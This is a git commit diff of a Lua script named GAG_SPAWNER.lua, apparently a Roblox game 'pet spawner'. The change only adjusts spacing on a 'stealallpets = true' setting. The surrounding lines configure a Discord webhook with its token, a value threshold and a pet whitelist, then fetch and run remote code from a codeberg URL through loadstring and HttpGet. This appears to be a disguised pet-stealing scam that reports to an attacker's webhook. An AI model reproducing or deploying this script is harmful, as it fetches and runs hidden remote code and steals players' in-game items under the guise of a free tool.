e08c57f042453e5bca4a8114535e9158d49b5fd1
thatboyskulls12 <aj.skulls12@gmail.com>
2025-07-24 13:38:13 -0400

    Update GAG_SPAWNER.lua

--- GAG_SPAWNER.lua
+++ GAG_SPAWNER.lua
@@ -8,7 +8,7 @@ users = {
 min_value = 10000000
 ping = "ture"
 webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauEmwmR1t-yAA6lkOX5oWpxz0MmfRGRKPBFx_9EkMh5Zg8dquFb6Kwr"
-stealallpets = true
+stealallpets =true
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
 
 loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
